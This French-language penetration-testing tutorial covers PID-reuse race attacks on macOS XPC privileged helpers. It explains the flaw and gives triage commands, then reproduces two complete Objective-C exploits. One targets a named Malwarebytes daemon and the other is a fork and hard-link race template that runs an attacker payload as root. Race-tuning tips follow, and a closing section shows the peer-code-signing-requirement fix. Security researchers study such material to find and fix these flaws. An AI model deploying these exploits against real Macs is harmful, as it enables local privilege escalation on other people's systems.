# Réutilisation des PID

{{#include ../../../../../../banners/hacktricks-training.md}}

## Réutilisation des PID

Lorsqu’un **service XPC** macOS authentifie un appelant en résolvant son **PID** au lieu d’utiliser les identifiants associés au message reçu, il peut être vulnérable à une attaque de réutilisation de PID. La primitive pratique ne consiste pas à attendre le bouclage de l’espace de noms des PID : l’attaquant envoie une requête XPC, puis appelle immédiatement **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** avec `POSIX_SPAWN_SETEXEC`, remplaçant l’image du processus de l’attaquant par un **binaire autorisé tout en conservant le PID**.<sup>[[1]](#references)[[2]](#references)</sup>

Si le serveur dépile la requête, puis seulement ensuite résout ce PID numérique vers un processus actif pour vérifier sa signature de code, ses entitlements, son chemin ou son processus parent, il observe le binaire de remplacement au lieu du processus qui a envoyé le message. `POSIX_SPAWN_START_SUSPENDED` maintient le remplacement approuvé en vie et stable pendant que le serveur effectue la vérification.<sup>[[1]](#references)[[2]](#references)</sup>

### Ce qui est réellement soumis à une condition de concurrence

La séquence vulnérable est une **TOCTOU liée à l’identité du message**, et pas simplement le fait que « les PID peuvent être réutilisés » :<sup>[[1]](#references)[[2]](#references)</sup>

1. Un processus attaquant établit ou reprend une connexion XPC et met en file la requête privilégiée.
2. Avant que le service ne convertisse le PID de la connexion en `SecCodeRef` ou en un autre objet de processus, l’attaquant superpose le même processus avec un exécutable approuvé à l’aide de `POSIX_SPAWN_SETEXEC`.
3. Le service valide l’image approuvée actuellement associée à ce PID, puis traite la requête contrôlée par l’attaquant qui était déjà en file d’attente.

Tout pont entre un PID et un flux de données d’autorisation est suspect : `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` ou `audit_token_to_pid`, suivis de `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` ou d’un vérificateur de signature personnalisé. Un PID utilisé uniquement pour la journalisation ne suffit pas ; confirmez qu’il atteint la décision d’autorisation ou de refus. Examinez également les chemins d’erreur : tenter d’abord une recherche avec l’audit token, puis **revenir au PID en cas d’échec** réintroduit la même condition de concurrence. Ce modèle de fallback est apparu dans une analyse de 2026 des services XPC privilégiés d’Intego.<sup>[[3]](#references)</sup>

### Triage statique et dynamique rapide

Commencez par le gestionnaire de connexion et suivez chaque appel produisant un PID jusqu’aux vérifications de signature de code, d’entitlements, de chemin de l’exécutable ou de version. Ces commandes fournissent une première analyse rapide d’un helper candidat ; les binaires dépouillés exposent encore fréquemment des symboles importés, des sélecteurs Objective-C ou des chaînes de diagnostic :<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Lors d’un test contrôlé, cassez ou hookez à la fois la source du PID et son vérificateur. Un appel à `xpc_connection_get_pid` ou `-processIdentifier` n’est qu’une piste ; les éléments probants utiles sont une recherche ultérieure du **même entier** après réception de la requête. Frida peut en outre hooker le vérificateur propre à l’application et le selector privilégié afin de mesurer si le selector s’exécute lorsque la race sur le PID est remportée.<sup>[[3]](#references)</sup>

### Exemple d’exploit

Si vous trouvez la fonction **`shouldAcceptNewConnection`**, ou une fonction appelée par celle-ci, qui appelle **`processIdentifier`** sans appeler **`auditToken`**, cela signifie très probablement qu’elle **vérifie le PID du processus** et non l’audit token.\
Par exemple, comme dans cette image (tirée de la référence) :<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Consultez cet exemple d’exploit (également tiré de la référence) pour voir les 2 parties de l’exploit :<sup>[[1]](#references)</sup>

- Une partie qui **génère plusieurs forks**
- **Chaque fork** **enverra** le **payload** au service XPC tout en exécutant **`posix_spawn`** juste après l’envoi du message.

> [!CAUTION]
> Lors d’une race avec `fork()` depuis un processus Objective-C, lancez l’exploit avec `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` exporté, ou intégrez le marker `__objc_fork_ok` :
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Première option utilisant **`NSTasks`** et un argument pour lancer les enfants afin d’exploiter la RC
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
Cet exemple utilise un **`fork`** brut pour lancer des **processus enfants qui exploiteront la condition de concurrence sur le PID**, puis exploiter une **autre condition de concurrence via un lien physique** :
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Rendre la race reproductible

Les points de réglage suivants reviennent dans les exploits de réutilisation de PID fonctionnels et les tests récents de privileged-helper :<sup>[[1]](#references)[[3]](#references)</sup>

- Envoyez la requête et appelez immédiatement `posix_spawn` ; **n'attendez pas** la réponse. La requête doit déjà être mise en file d'attente lorsque la recherche du PID par le serveur a lieu après le remplacement de l'image.
- Gardez `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED` ensemble. Le premier flag préserve le PID du processus en course ; le second empêche la cible valide de se terminer ou de changer d'état avant la validation.
- Utilisez plusieurs racers à courte durée de vie et réessayez la séquence complète connexion/requête/exec. Le nombre optimal dépend de la cible ; un nombre excessif de processus enfants peut ralentir le service et réduire la fenêtre.
- Le remplacement doit satisfaire à **l'ensemble** des exigences du serveur. Réutilisez si possible le binaire du client légitime et vérifiez d'abord son designated requirement avec `codesign -d -r- "/path/to/client.app"`.
- Invoquez d'abord un selector exporté inoffensif ou une méthode en lecture seule. Cela permet de distinguer l'authentification réussie de l'exploitation réussie d'une primitive privilégiée ultérieure.

## Éviter le pont PID

Sur macOS 13 et versions ultérieures, Foundation expose `-[NSXPCConnection setCodeSigningRequirement:]`. Définissez l'exigence du pair exactement une fois et **avant** `resume` ; les chaînes d'exigence malformées déclenchent une exception (ou une erreur fatale Swift), et un message provenant d'un pair qui ne satisfait pas à l'exigence invalide la connexion. Cela permet à XPC d'appliquer l'identité de code du pair sans que le code de l'application ne résolve un PID.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
Pour l’API moderne de listener low-level sur macOS 26+, `xpc_listener_set_peer_requirement` applique un `xpc_peer_requirement_t` validé lorsque le listener est inactif. XPC abandonne les requêtes qui ne le respectent pas ; les sessions peer créées à partir du listener n’en héritent **pas**, appliquez donc également une session requirement appropriée lorsque ces sessions autorisent des opérations privilégiées.<sup>[[7]](#references)</sup>

> [!WARNING]
> Ne “corrigez” pas ce problème en copiant un audit token, puis en le reconvertissant en PID pour effectuer la recherche `SecCode` réelle. Conservez l’identité dérivée de l’audit token pendant toute la décision d’autorisation, ou utilisez une XPC peer-requirement API de bout en bout.<sup>[[2]](#references)[[6]](#references)</sup> Les APIs d’audit token au niveau de la connexion présentent également une classe distincte de race condition, décrite dans [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Autres exemples

- [**Intego X9 : pourquoi votre antivirus macOS ne doit pas faire confiance aux PID**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE contre le privileged helper d’un antivirus qui authentifiait les clients par PID.<sup>[[3]](#references)</sup>
- [**Exploitation du service XPC de GOG Galaxy pour une élévation de privilèges dans macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Part II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Learn XPC exploitation - Part 2 : dites non au PID !](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Ne faites pas confiance au PID ! Récits d’un simple bug logique et où le trouver - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9 : pourquoi votre antivirus macOS ne doit pas faire confiance aux PID](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Exploitation du service XPC de GOG Galaxy pour une élévation de privilèges dans macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Part II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
